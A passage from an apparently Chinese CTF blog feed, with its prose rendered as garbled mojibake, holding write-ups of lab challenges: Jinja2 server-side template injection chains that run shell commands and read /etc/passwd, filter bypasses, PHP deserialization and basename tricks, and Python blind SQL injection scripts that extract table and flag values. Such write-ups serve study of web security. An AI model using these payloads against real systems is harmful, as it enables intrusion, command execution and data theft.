src="2.PNG"></p><p>ä½†æ˜¯æ˜¯è¿”å›é”™è¯¯çš„ï¼Œè¯´æ˜æœ‰å¯èƒ½flagæ–‡ä»¶åå¹¶ä¸æ˜¯flag</p><p>è¿™é‡Œå­¦åˆ°äº†ä¸¤ä¸ªå‘½ä»¤</p><p>proc/self/environ è¯»å†…å­˜</p><p>proc/self/cmdline  å¯åŠ¨å†…æ ¸å‚æ•°</p><p><img src="3.PNG"></p><p>çœ‹åˆ°äº† flasklight/app.py,è¿›è¡Œè¯»å–</p><p><img src="4.PNG"></p><p>çœ‹åˆ°äº†blacklistï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘å°è¯•globalsï¼Œå‡ºç°é”™è¯¯çš„åŸå› </p><p>è¿™é‡Œå­¦ä¹ äº†ä¸€ä¸ªæ–°çš„ç±»</p><p>subprocess.Popenè¿™ä¸ªç±»</p><p><img src="5.PNG"></p><p>æµ‹è¯•è„šæœ¬</p><p>å¾—åˆ°è¯¥ç±»æ˜¯258</p><pre><code>&#123;&#123;''.class.mro[2].subclasses()[258]('ls', shell=True, stdout=-1).communicate()&#125;&#125;</code></pre><p>ä½†æ˜¯ï¼Œå¦‚æœglobalsè¢«è¿‡æ»¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨[â€˜__gloâ€™+â€™bals__â€™]ç»•è¿‡ï¼ŒåŒæ ·å¯ä»¥å¾—åˆ°flag</p><pre><code>&#123;&#123;"".__class__.__mro__[2].__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen("ls").read()&#125;&#125;</code></pre><p>71: &lt;class â€˜site._Printerâ€™&gt;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2021/04/09/SSTI/"/>
      <url>/2021/04/09/SSTI/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">åŸæ–‡åœ°å€</a></p><span id="more"></span><h2>0x01 ç®€ä»‹</h2><p>SSTIï¼ŒæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œé€šè¿‡ä¸æœåŠ¡ç«¯æ¨¡æ¿çš„è¾“å…¥è¾“å‡ºäº¤äº’ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥æ ¼åœ°æƒ…å†µä¸‹ï¼Œæ„é€ æ¶æ„è¾“å…¥æ•°æ®ï¼Œä»è€Œè¾¾åˆ°è¯»å–æ–‡ä»¶æˆ–è€…getshellåœ°ç›®çš„</p><h2>0x02 æ”»å‡»æµç¨‹</h2><p>å‡½æ•°è§£æ</p><blockquote><p>__class__ è¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹<br><br>__bases__è¿”å›ç±»å‹åˆ—è¡¨<br><br>__mro__æ­¤å±æ€§æ˜¯åœ¨æ–¹æ³•è§£ææœŸé—´å¯»æ‰¾åŸºç±»æ—¶è€ƒè™‘çš„ç±»å…ƒç»„<br><br>__subsclasses__()è¿”å›objectçš„å­ç±»<br><br>__globals__å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ ä¸ func_globalsç­‰ä»·<br></p></blockquote><p>è·å–åŸºæœ¬ç±»</p><blockquote><p>â€˜â€™.__class__.__mro__[2]<br><br>{}.__class__.__bases__[0]<br><br>().__class__.__bases__[0]<br><br>[].__class__.__bases__[0]<br><br>request.__class__.__mro__[8] //é’ˆå¯¹jinjia2/flaskä¸º[9]é€‚ç”¨<br></p></blockquote><p>è·å¾—åŸºæœ¬ç±»åï¼Œç»§ç»­å‘ä¸‹è·å–åŸºæœ¬ç±»ï¼ˆobjectï¼‰çš„å­ç±»</p><blockquote><p>object.__subclasses__()</p></blockquote><p>æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±»(åœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦wrapperçš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦warpperçš„)</p><p>æŸ¥çœ‹å…¶å¼•ç”¨<strong>builtins</strong></p><blockquote><p>builtinså³æ˜¯å¼•ç”¨ï¼ŒPythonç¨‹åºä¸€æ—¦å¯åŠ¨ï¼Œå®ƒå°±ä¼šåœ¨ç¨‹åºå‘˜æ‰€å†™çš„ä»£ç æ²¡æœ‰è¿è¡Œä¹‹å‰å°±å·²ç»è¢«åŠ è½½åˆ°å†…å­˜ä¸­äº†,è€Œå¯¹äºbuiltinså´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è°ƒç”¨å¼•ç”¨çš„æ¨¡å—</p></blockquote><pre><code>    &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]    ä¹Ÿæœ‰å¯èƒ½æ˜¯&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre><p>ä½¿ç”¨fileä¸€å®ç°è¯»å–æ–‡ä»¶çš„åŠŸèƒ½</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;D://.cbp&#39;).read()</code></pre><h2>0x03è¯»å†™æ–‡ä»¶</h2><p>æ–¹æ³•ä¸€åŒä¸Šé¢å†™çš„</p><p>æ–¹æ³•äºŒï¼š</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40] [].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() #å°†read() ä¿®æ”¹ä¸º write() å³ä¸ºå†™æ–‡ä»¶</code></pre><p><img src="1.PNG"></p><p>å¯ä»¥ç”¨è¿™ä¸ªæ‰¾ä¸€ä¸‹ï¼Œç´¢å¼•å€¼</p><h2>0x04å‘½ä»¤æ‰§è¡Œ</h2><p>æ–¹æ³•ä¸€ï¼ˆevalï¼‰ï¼š</p><pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></pre><p>æ–¹æ³•äºŒï¼š</p><pre><code>    [].__class__.__base__.__subclasses__()[60].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[79](&#39;whoami&#39;)æˆ–è€…[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)</code></pre><p>åšä¹‹å‰è‡ªå·±è¯•è¯•</p><p>![2.PNG]</p><p>åˆ©ç”¨commands</p><pre><code>&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre><h2>å¸¸è§ç»•è¿‡æ–¹å¼</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF-spaceman</title>
      <link href="/2021/04/09/DJBCTF-spaceman/"/>
      <url>/2021/04/09/DJBCTF-spaceman/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class spaceman</span><br><span class="line">&#123;</span><br><span class="line">   public $username;</span><br><span class="line">   public $password;</span><br><span class="line">   public function __construct($username,$password)</span><br><span class="line">   &#123;</span><br><span class="line">       $this-&gt;username &#x3D; $username;</span><br><span class="line">       $this-&gt;password &#x3D; $password;</span><br><span class="line">   &#125;</span><br><span class="line">   public function __wakeup()</span><br><span class="line">   &#123;</span><br><span class="line">       if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;ctfshowvip&#39;)</span><br><span class="line">       &#123;</span><br><span class="line">           include(&quot;flag.php&quot;);</span><br><span class="line">           echo $flag;    </span><br><span class="line">       &#125;</span><br><span class="line">       else</span><br><span class="line">       &#123;</span><br><span class="line">           echo &#39;wrong password&#39;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">   return str_replace(&#39;ctfshowup&#39;,&#39;ctfshow&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$str &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">if(preg_match(&#39;&#x2F;\_|\.|\]|\[&#x2F;is&#39;,$str))&#123;            </span><br><span class="line">   die(&quot;I am sorry but you have to leave.&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   extract($_POST);</span><br><span class="line">&#125;</span><br><span class="line">$ser &#x3D; filter(serialize(new spaceman($user_name,$pass_word)));</span><br><span class="line">$test &#x3D; unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®æ€»ä½“æ¥è¯´ä¸éš¾ï¼Œå°±çŸ¥é“phpè§£æç‰¹æ€§ç‰¹æ€§å°±å¥½äº†ï¼Œå½“è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œç©ºæ ¼ï¼Œ+ï¼Œ[,],phpä¼šè‡ªåŠ¨è§£ææˆä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥æˆ‘ä»¬postæäº¤pass word=ctfshowvip,å°±å¥½äº†ï¼Œ</p><p><img src="1.PNG"></p><p>ä½†æ˜¯ï¼Œå› ä¸ºè¿™ä¸ªæœ‰ä¸€ä¸ªå‡½æ•°filter,è¿™é‡Œåº”è¯¥æ¶‰åŠåˆ°äº†å­—ç¬¦ä¸²é€ƒé€¸é—®é¢˜ã€‚æ‰€ä»¥æ„Ÿè§‰åˆšæ‰é‚£ä¸ªåº”è¯¥æ˜¯éé¢„æœŸè§£ã€‚</p><p><img src="2.PNG"></p><p>è¿™æ ·å­ï¼Œå­—ç¬¦ä¸²é€ƒé€¸</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DJBCTF-æœ‰æ‰‹å°±è¡Œ</title>
      <link href="/2021/04/09/F5-%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C/"/>
      <url>/2021/04/09/F5-%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.PNG"></p><p>ç›´æ¥ç”¨è¿™ä¸ªè¿›è¡Œbase64è§£ç å‘ç°è§£ä¸å‡ºæ¥ï¼Œç„¶åä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œè¿™æ˜¯base64è½¬å›¾ç‰‡ã€‚data:image/jpg;base64,(åŠ ä¸Šåˆšæ‰çš„base64ç )</p><p><img src="2.png"></p><p>æ¥å‡ºæ¥æ˜¯è¿™ä¸ª</p><p>ç„¶åçœ‹äº†ä¸€ä¸‹urlï¼Œæ˜¯ï¼Ÿfile=scanï¼Œæ”¹æˆflagï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œç„¶åæˆ‘å°±å¡ä½äº†ï¼Œå› ä¸ºæˆ‘å‘ç°æ”¹æˆå•¥é¡µé¢éƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚emmm,çœ‹WPï¼Œå‘ç°è‡ªå·±è¿˜æ˜¯ä¸å¤Ÿæ•æ„Ÿï¼Œä¸ºä»€ä¹ˆä¿®æ”¹ä»»ä½•ä¸œè¥¿ï¼Œé¡µé¢éƒ½æ²¡æœ‰æ”¹å˜ï¼Œé‚£æ˜¾ç„¶æ˜¯æœ‰é—®é¢˜åœ°ã€‚<br>ï¼Ÿfile=flag,çœ‹æºä»£ç ï¼ŒåŒæ ·è¿›è¡Œåˆšæ‰çš„æ“ä½œï¼Œæ‰«å‡ºæ¥æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ˜¯ä¸€ä¸ªå¾®ä¿¡ç¨‹åºã€‚</p><p><img src="3.PNG"></p><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼Œå¾®ä¿¡å°ç¨‹åºæ˜¯ä¸èƒ½åœ¨ç½‘é¡µä¸­æ‰“å¼€çš„ã€‚é‚£ä¹ˆå°±æ„å‘³è¿™æˆ‘ä»¬æ²¡æœ‰åŠæ³•é€šè¿‡ä¿®æ”¹ç½‘é¡µå†…å®¹å»è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚</p><p>çœ‹äº†WPæ˜¯è¿›è¡Œåç¼–è¯‘å°ç¨‹åº</p><p>ä¸‹è½½ä¸€ä¸ªå¤œç¥æ¨¡æ‹Ÿå™¨</p><p><img src="4.PNG"></p><p>ç„¶åç™»å½•å¾®ä¿¡ï¼Œæ‰“å¼€å°ç¨‹åºï¼Œä¹‹ååœ¨ESæ–‡ä»¶ç®¡ç†æµè§ˆå™¨ä¸­ï¼Œåœ¨æ ¹ç›®å½•/data/data/com.tencent.mm/MicroMsg/55dd515472835181368568115ffc4cc1/appbrand/pkg/ä¸­æ‰¾åˆ°</p><p><img src="5.PNG"></p><p>ç„¶åï¼Œåˆ†äº«åˆ°ç”µè„‘ä¸Šï¼Œç„¶åè®°äº‹æœ¬æ‰“å¼€å…¨å±€æœç´¢flag,è·å¾—flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Can-you-guess-it</title>
      <link href="/2021/04/08/Can-you-guess-it/"/>
      <url>/2021/04/08/Can-you-guess-it/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ‰“å¼€é¢˜ç›®ï¼Œç‚¹å‡»sourceï¼Œæˆ‘çš„æƒ³æ³•å°±æ˜¯æ€ä¹ˆå»æ„é€ guessä¸$secretç›¸åŒï¼Œä½†æ˜¯è‡ªå·±å°è¯•åï¼Œç„¶ååˆä¸Šç½‘æŸ¥äº†ä¸€ä¸‹hash_equalsçš„èµ„æ–™ï¼Œå‘ç°å¥½åƒç»•è¿‡ä¸äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">   exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line"> highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line"> $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line"> if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">   $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line"> &#125; else &#123;</span><br><span class="line">   $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆè®°å½•ä¸€ä¸‹ï¼Œè¿™é‡Œæœ‰ä¸€äº›æ–°çš„å‡½æ•°å’Œå˜é‡æ˜¯ä»¥å‰æ²¡æœ‰è§è¿‡çš„</p><li>$server['PHP_SELF']:è¡¨ç¤ºå½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€<p><img src="1.PNG"></p><li>basename è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†<p><img src="2.PNG"></p><p>æˆ‘è¾“å…¥çš„æ˜¯/index.php/text.php?s</p><p>è¿”å›çš„æ˜¯text.phpï¼Œé¡µé¢è§£æçš„æ˜¯index.php</p><p><a href="https://bugs.php.net/bug.php?id=62119">basenameå­˜åœ¨bug</a></p><blockquote><p>var_dump(basename(â€œxffconfig.phpâ€)); // =&gt; config.php<br>var_dump(basename(â€œconfig.php/xffâ€)); // =&gt; config.php</p></blockquote><p><img src="3.PNG"></p><p><img src="4.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æˆç»©æŸ¥è¯¢æœº</title>
      <link href="/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/"/>
      <url>/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php&#39;</span><br><span class="line"></span><br><span class="line">#print(requests.get(url&#x3D;url,params&#x3D;params).text)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   min&#x3D;32</span><br><span class="line">   max&#x3D;128</span><br><span class="line">   mid&#x3D;(min+max)&#x2F;&#x2F;2</span><br><span class="line">   while min&lt;max:</span><br><span class="line">       payload&#x3D;&quot;http:&#x2F;&#x2F;e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn&#x2F;?stunum&#x3D;0^(ascii(substr(database(),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">       re&#x3D;requests.get(url&#x3D;payload).text</span><br><span class="line">       if &#39;Hi admin, your score is: 100&#39; in re:</span><br><span class="line">           min&#x3D;mid+1</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">       else:</span><br><span class="line">           max&#x3D;mid</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">   if mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;127:</span><br><span class="line">       break</span><br><span class="line">   flag&#x3D;flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>çˆ†åº“</p><p>ctf</p><p>payload=â€<a href="http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0%5E(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;ctf&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p>flag,score</p><p>payload=â€<a href="http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0%5E(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p>flag,value</p><p>payload=â€e3a03f9e-0f9c-4d1d-bc06-ec6e68e04bda.node3.buuoj.cn/?stunum=0^(ascii(substr((select(group_concat(value))from(ctf.flag)),%d,1))&gt;%d)â€%(i,mid)</p><p>å¾—åˆ°flag.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜-final-sql</title>
      <link href="/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/"/>
      <url>/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>è¿™æ˜¯å…³äºç›²æ³¨çš„ä¸€é“é¢˜ï¼Œæ‰“ç®—ç»ƒç»ƒè¿™ä¸€æ–¹é¢çš„é¢˜ç›®ï¼Œé¡ºä¾¿è”ç³»ä¸€ä¸‹å†™pythonè„šæœ¬</p><p>äºŒåˆ†æ³•æ³¨å…¥ï¼Œå¼‚æˆ–æ³¨å…¥</p><p><img src="1.PNG"></p><p>å…¶å®æç¤ºçš„å¾ˆæ˜æ˜¾äº†ã€‚sqlç›²æ³¨</p><p>id=1  NO! Not this! Click others~~~ â€¦..</p><p>å½“id=7çš„æ—¶å€™ï¼Œæ˜¾ç¤ºERROR!!!</p><p>id=0^1ï¼Œæ˜¾ç¤ºçš„è·Ÿid=1ä¸€æ ·ï¼Œid=0^0,æ˜¯ERRORï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®è¿™ä¸€ç‚¹æ¥æ¥è„šæœ¬è¿›è¡Œçˆ†ç ´</p><p><img src="2.PNG"></p><p>fuzzè¢«ç¦ç”¨çš„</p><blockquote><p>ç©ºæ ¼<br>and<br>mid<br>like<br>union<br>char<br>insert<br>into<br>/**/<br>by<br>having</p></blockquote><p>çˆ†åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php&#39;</span><br><span class="line"></span><br><span class="line">#print(requests.get(url&#x3D;url,params&#x3D;params).text)</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   min&#x3D;32</span><br><span class="line">   max&#x3D;128</span><br><span class="line">   mid&#x3D;(min+max)&#x2F;&#x2F;2</span><br><span class="line">   while min&lt;max:</span><br><span class="line">       payload&#x3D;&quot;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php?id&#x3D;0^(ascii(substr(database(),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">       re&#x3D;requests.get(url&#x3D;payload).text</span><br><span class="line">       if &#39;NO! Not this! Click others~~~&#39; in re:</span><br><span class="line">           min&#x3D;mid+1</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">       else:</span><br><span class="line">           max&#x3D;mid</span><br><span class="line">           mid &#x3D; (min + max) &#x2F;&#x2F; 2</span><br><span class="line">   if mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;127:</span><br><span class="line">       break</span><br><span class="line">   flag&#x3D;flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ˜¯ä»¿ç…§åˆ«äººå†™çš„ï¼Œä½†æ˜¯å¾ˆå¼€å¿ƒï¼Œå› ä¸ºè¿™æ˜¯ç¬¬ä¸€æ¬¡è‡ªå·±å†™çš„è„šæœ¬åœ¨é¢˜ç›®ä¸Šç”¨ä¸Šäº†ã€‚</p><p><img src="3.PNG"></p><p>ç©ºæ ¼è¢«è¿‡æ»¤äº†è¿˜ä¸å…è®¸ç”¨æ³¨é‡Šç¬¦</p><p>ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=â€™geekâ€™))))</p><p>æŠ¥è¡¨</p><p>payload=â€<a href="http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0%5E(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p><img src="4.PNG"></p><p>èŠ‚çœæ—¶é—´ï¼Œå› ä¸ºæå‰çŸ¥é“flagåœ¨ç¬¬ä¸€ä¸ªè¡¨ä¸­</p><p>çˆ†å­—æ®µ</p><p>payload=â€<a href="http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0%5E(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)&quot;%(i,mid)">http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p><img src="5.PNG"></p><p>ç›´æ¥çˆ†password</p><p>payload=â€<a href="http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0%5E(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),%25d,1))&gt;%25d)&quot;%25(i,mid)">http://77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn/search.php?id=0^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),%d,1))&gt;%d)&quot;%(i,mid)</a></p><p><img src="6.PNG"></p><p>å¾—åˆ°flag</p><p>#åè®°</p><p>ä¸ºä»€ä¹ˆè¿™é“é¢˜ç›®å¯ä»¥åˆ©ç”¨å¼‚æˆ–ç›²æ³¨</p><p>é¦–å…ˆæ²¡æœ‰è¿‡æ»¤^,è€Œä¸”æˆ‘ä»¬å¯ä»¥å‘ç°1^0,å’Œ1^1çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®é¡µé¢è¿”å›çš„ç»“æœæ¥è°ƒæ•´äºŒåˆ†æ³•</p><p>å¦å¤–æˆ‘è®¤ä¸ºåšsqlè¿˜è¦æˆåŠŸçš„æ‰¾åˆ°æ³¨å…¥ç‚¹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE ME</title>
      <link href="/2021/03/29/ME/"/>
      <url>/2021/03/29/ME/</url>
      
